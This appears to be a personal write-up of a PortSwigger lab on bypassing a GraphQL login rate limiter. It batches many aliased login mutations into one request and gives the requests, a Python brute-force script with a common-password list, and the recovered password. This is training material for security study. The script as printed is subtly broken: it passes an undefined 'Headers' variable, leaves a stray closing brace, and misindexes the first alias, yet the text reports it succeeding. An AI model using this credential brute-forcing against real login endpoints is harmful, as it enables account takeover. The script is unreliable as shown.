# Lab 4: Bypassing GraphQL Brute Force Protections

**Platform:** PortSwigger Web Security Academy

**Category:** GraphQL API Vulnerabilities (PRACTITIONER)

<img width="997" height="207" alt="image" src="https://github.com/user-attachments/assets/f1d9eea0-7a6a-4a25-8b1e-2bd5d4a006f2" />


## Lab Description

The user login mechanism for this lab is powered by a GraphQL API. The API endpoint has a rate limiter that returns an error if it receives too many requests from the same origin in a short space of time.

To solve the lab, brute force the login mechanism to sign in as carlos. Use the list of authentication lab passwords as your password source. 

**Open The Password List:** [PortSwigger Authentication Lab Passwords](https://portswigger.net/web-security/authentication/auth-lab-passwords)

## Steps

### 1. Identifying the GraphQL Login Endpoint

First, I navigated to the login page and attempted to log in using any credentials while intercepting the request in Burp Suite.

I inspected the request in Burp Suite → Proxy → HTTP history and discovered that the login functionality was powered by a GraphQL endpoint:

```http
POST /graphql/v1 HTTP/2
Host: YOUR-LAB-ID.web-security-academy.net
Content-Type: application/json
```

<img width="1422" height="587" alt="image" src="https://github.com/user-attachments/assets/6b4534da-f3c5-40dd-b7b9-e4bf02287d30" />

The original GraphQL request was:

```graphql
mutation login($input: LoginInput!) {
    login(input: $input) {
        token
        success
    }
}
```

The request used the following variables:

```json
{
    "input": {
        "username": "carlos",
        "password": "ss"
    }
}
```

The response contained two interesting fields:

- `token`: The authentication token returned after a successful login.
- `success`: Indicates whether the authentication attempt succeeded.

<img width="1357" height="562" alt="image" src="https://github.com/user-attachments/assets/2898296e-ce16-433a-97ff-06268683bb0e" />


I sent the request to Burp Suite Repeater to investigate the login mechanism further.

### 2. Identifying the Rate-Limiting Protection

I noticed that sending multiple login requests individually eventually triggered the application's rate limiter.

This made traditional brute-force testing inefficient because each password attempt required a separate HTTP request.

I decided to investigate whether GraphQL aliases could help bypass this restriction.

### 3. Bypassing the Rate Limiter Using GraphQL Aliases

GraphQL supports Aliases, which allow clients to execute the same field multiple times within a single query while assigning a different name to each execution.

I modified the original login mutation to include multiple aliased login operations:

```graphql
   mutation login{
        s1: login(input: {username: "carlos", password: "ss1"}) {
            token
            success
        },
       s2: login(input: {username:"carlos", password:"ss2"}) {
            token
            success
        }
    }
```

<img width="1356" height="367" alt="image" src="https://github.com/user-attachments/assets/9f5d5f92-cd5c-49f3-8c5f-1284d2295e23" />


Each alias represents a separate login attempt, but both attempts are sent within the same HTTP request.

This allowed me to test multiple passwords without sending a separate request for every attempt.

The important observation was that the rate limiter counted HTTP requests rather than the individual login operations inside the GraphQL query. So, the Alias technique was worked.

### 4. Automating the Brute-Force Attack with Python

The lab provides a list of 100 commonly used passwords for authentication testing.

Testing these passwords individually would be inefficient, so I decided to automate the process using Python.

The idea was to:

1. Iterate through the password list.
2. Generate a unique GraphQL alias for each password.
3. Add multiple login mutations to a single GraphQL request.
4. Send all login attempts in one HTTP request.
5. Parse the JSON response and check the success field for each alias.
6. Print the password when a successful authentication attempt is found.

### The Python Script

```python
import requests

url = "https://YOUR-LAB-ID.web-security-academy.net/graphql/v1"

passwords = [
    "password", "12345678", "qwerty", "123456789", "12345",
    "1234", "111111", "1234567", "dragon", "123123",
    "baseball", "abc123", "football", "monkey", "letmein",
    "shadow", "master", "666666", "qwertyuiop", "123321",
    "mustang", "1234567890", "michael", "654321", "superman",
    "1qaz2wsx", "7777777", "121212", "000000", "qazwsx",
    "123qwe", "killer", "trustno1", "jordan", "jennifer",
    "zxcvbnm", "asdfgh", "hunter", "buster", "soccer",
    "harley", "batman", "andrew", "tigger", "sunshine",
    "iloveyou", "2000", "charlie", "robert", "thomas",
    "hockey", "ranger", "daniel", "starwars", "klaster",
    "112233", "george", "computer", "michelle", "jessica",
    "pepper", "1111", "zxcvbn", "555555", "11111111",
    "131313", "freedom", "777777", "pass", "maggie",
    "159753", "aaaaaa", "ginger", "princess", "joshua",
    "cheese", "amanda", "summer", "love", "ashley",
    "nicole", "chelsea", "biteme", "matthew", "access",
    "yankees", "987654321", "dallas", "austin", "thunder",
    "taylor", "matrix", "mobilemail", "mom", "monitor",
    "monitoring", "montana", "moon", "moscow"
]

headers = {
    "Cookie": "session=YOUR-SESSION-COOKIE"
}

c1 = "\n   mutation login{\n s1: login(input: {username: \"carlos\", password: \"123456\"}) {\n            token\n            success\n        },\n"
for i in range(0, 99):
     c1 += f" s{i+2}: login(input: {{username: \"carlos\", password: \"{passwords[i]}\"}}) {{\n            token\n            success\n        }},\n"
       
c1+= "},"
response = requests.post(url, headers=Headers, json={"query": c1 , "operationName": "login"})
data = response.json()["data"]
for alias, result in data.items():
    if result and result.get("success") is True:
        print(f"Password found: {passwords[int(alias[1:]) - 2]}")
        break
else:
    print("Password not found")
```

**Note:** Replace `YOUR-LAB-ID` and `YOUR-SESSION-COOKIE` with the values from your current lab session.

The script assigns a unique alias (`s1`, `s2`, `s3`, etc.) to each login attempt. This makes it easy to associate each response with its corresponding password.

### 5. Retrieving the Password and Logging In

After running the script, I successfully identified the correct password:

```text
Password found: austin
```

<img width="793" height="62" alt="Screenshot 2026-11-03 060634" src="https://github.com/user-attachments/assets/0514aaa0-12a9-437d-800e-bfe2ae0d6d1c" />

I returned to the login page and authenticated using the following credentials:

```text
Username: carlos
Password: austin
```

I successfully logged in as Carlos.

Alhamdulillah, the lab was solved.

<img width="1710" height="666" alt="image" src="https://github.com/user-attachments/assets/52277cb5-b256-44a5-8efe-ccba6f4c67af" />

---

**Lab Link:** [Open the lab](https://portswigger.net/web-security/graphql/lab-graphql-brute-force-protection-bypass)

See you in the next lab solution, In sha Allah!

سبحانك اللهم وبحمدك، أشهد أن لا إله إلا أنت، أستغفرك وأتوب إليك.
